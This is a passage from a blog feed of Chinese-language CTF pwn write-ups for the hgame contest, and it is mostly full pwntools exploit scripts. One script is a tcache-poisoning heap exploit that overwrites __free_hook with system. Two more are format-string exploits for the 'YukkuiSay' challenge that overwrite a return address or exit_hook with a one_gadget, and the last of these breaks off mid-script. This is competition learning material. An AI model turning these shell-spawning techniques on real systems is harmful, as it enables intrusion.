class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1e6690</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1e38a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base<br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x1e5280</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cry</span>):<br>    ans = cry<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        ans = (ans &gt;&gt; <span class="hljs-number">12</span>) ^ cry<br>    <span class="hljs-keyword">return</span> ans<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x20</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>show(<span class="hljs-number">6</span>)<br>leak = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>key = decrypt(leak) &gt;&gt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;key&#x27;</span>, key)<br><br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0xf0</span>)<br>show(<span class="hljs-number">7</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1e3c80</span><br>get_gadgets(libc_base)<br><br>edit(<span class="hljs-number">6</span>, p64(key ^ free_hook))<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x80</span>)<br><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>edit(<span class="hljs-number">11</span>, p64(system))<br><br>delete(<span class="hljs-number">8</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week2</title>
    <link href="/2023/02/06/2022-hgame-week2/"/>
    <url>/2023/02/06/2022-hgame-week2/</url>
    
    <content type="html"><![CDATA[<h1 id="hgame-week2-pwn-wp"><a href="#hgame-week2-pwn-wp" class="headerlink" title="hgame week2 pwn wp"></a>hgame week2 pwn wp</h1><h2 id="YukkuiSay"><a href="#YukkuiSay" class="headerlink" title="YukkuiSay"></a>YukkuiSay</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>格式化字符串漏洞。泄漏libc地址和stack地址，再覆盖栈上<code>__libc_start_main</code>为<code>one_gadget</code>。</p><p><img src="/img/2022-hgame-week2/image-20230206231545855.png" alt="image-20230206231545855"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>ld = ELF(<span class="hljs-string">&#x27;./ld-2.31.so&#x27;</span>)<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">31594</span>)<br><br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sdl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myformat</span>(<span class="hljs-params">offset, addr, data</span>):<br>    A = data &amp; <span class="hljs-number">0xff</span><br>    B = (data &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    C = (data &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    D = (data &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;A: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(A)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;B: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(B)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;C: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(C)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;D: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(D)&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, y</span>):<br>        <span class="hljs-keyword">return</span> ((x - y) + <span class="hljs-number">0x100</span>) % <span class="hljs-number">0x100</span><br><br>    payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(A) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(B, A)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">1</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(C, B)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">2</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(D, C)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">3</span>)<br><br>    payload = payload.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    payload = payload.encode()<br><br>    payload += p64(addr)<br>    payload += p64(addr + <span class="hljs-number">1</span>)<br>    payload += p64(addr + <span class="hljs-number">2</span>)<br>    payload += p64(addr + <span class="hljs-number">3</span>)<br><br>    <span class="hljs-keyword">return</span> payload<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;let Yukkri say?&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x98</span><br>p.send(payload)<br><br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br><br>libc_base = leak - <span class="hljs-number">0x1ed5c0</span><br>log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>one_gadget = libc_base + gadgets[<span class="hljs-number">1</span>]<br><br>p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span><br>p.send(payload)<br><br>stack = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;stack&#x27;</span>, stack)<br><br>p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br>key = stack + <span class="hljs-number">8</span><br>payload = p64(key) + p64(key + <span class="hljs-number">1</span>) + p64(key + <span class="hljs-number">2</span>) + p64(key + <span class="hljs-number">3</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;prepared a gift for you: &#x27;</span>)<br><br>payload = myformat(<span class="hljs-number">8</span>, key, one_gadget)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>泄漏libc地址，覆盖exit_hook为one_gadget。</p><p>注意，_rtld_global在ld上，ld距离libc地址不确定，需要爆破偏移。</p><p>爆破脚本参考WJH师傅的脚本：<a href="https://blog.wjhwjhn.com/archives/593/">https://blog.wjhwjhn.com/archives/593/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>ld = ELF(<span class="hljs-string">&#x27;./ld-2.31.so&#x27;</span>)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sdl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myformat</span>(<span class="hljs-params">offset, addr, data</span>):<br>    A = data &amp; <span class="hljs-number">0xff</span><br>    B = (data &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    C = (data &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    D = (data &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;A: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(A)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;B: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(B)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;C: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(C)&#125;</span> \n&#x27;</span> + <span class="hljs-string">f&#x27;D: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(D)&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cal</span>(<span class="hljs-params">x, y</span>):<br>        <span class="hljs-keyword">return</span> ((x - y) + <span class="hljs-number">0x100</span>) % <span class="hljs-number">0x100</span><br><br>    payload = <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(A) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">6</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(B, A)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">1</span> + <span class="hljs-number">6</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(C, B)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">2</span> + <span class="hljs-number">6</span>)<br>    payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(cal(D, C)) + <span class="hljs-string">&#x27;c%&#123;&#125;$hhn&#x27;</span>.<span class="hljs-built_in">format</span>(offset + <span class="hljs-number">3</span> + <span class="hljs-number">6</span>)<br><br>    payload = payload.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    payload = payload.encode()<br><br>    payload += p64(addr)<br>    payload += p64(addr + <span class="hljs-number">1</span>)<br>    payload += p64(addr + <span class="hljs-number">2</span>)<br>    payload += p64(addr + <span class="hljs-number">3</span>)<br><br>    p.send(payload)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak</span>():<br>    p.recvuntil(<span class="hljs-string">&#x27;let Yukkri say?&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x98</span><br>    p.send(payload)<br><br>    leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br><br>    libc_base = leak - <span class="hljs-number">0x1ed5c0</span><br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-keyword">return</span> libc_base<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">libc_base, ld_base</span>):<br>    log.success(<span class="hljs-string">&#x27;ld_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(ld_base))<br><br>    gadgets = [<span class="hljs-number">0xe3afe</span>, <span class="hljs-number">0xe3b01</span>, <span class="hljs-number">0xe3b04</span>]<br>    one_gadget = libc_base + gadgets[<span class="hljs-number">0</span>]<br><br>    rtld_global = ld_base + ld.sym[<span class="hljs-string">&#x27;_rtld_global&#x27;</span>]<br>    exit_hook = rtld_global + <span class="hljs-number">0xf08</span><br><br>    p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br><br>    payload = p64(exit_hook) + p64(exit_hook + <span class="hljs-number">1</span>) + p64(exit_hook + <span class="hljs-number">2</span>) + p64(exit_hook + <span class="hljs-number">3</span>)<br>    p.sendline(payload)<br><br>    p.recvuntil(<span class="hljs-string">&#x27;anything else?(Y/n)&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;n&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">&#x27;prepared a gift for you: &#x27;</span>)<br><br>    payload = myformat(<span class="hljs-number">2</span>, exit_hook, one_gadget)<br>    p.sendline(payload)<br>    <br><br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>        <span class="hljs-keyword">try</span>:<br>            p = process(fn)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;times: <span class="hljs-subst">&#123;x * <span class="hljs-number">10</span> + y&#125;</span>&#x27;</span>)<br><br>            libc_base = leak()<br>            offset = <span class="hljs-number">0x200000</span><br>            offset += x &lt;&lt; <span class="hljs-number">16</span><br>            offset += y &lt;&lt; <span class="hljs-number">12</span><br>            lg(<span class="hljs-string">&#x27;offset&#x27;</span>, offset)<br>            ld_base = libc_base + offset<br><br>            attack(libc_base, ld_base)<br>            <br>            p.sendline(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>            p.recvline()<br>            temp = p.recv(timeout=<span class="hljs-number">0.5</span>)<br>            <span 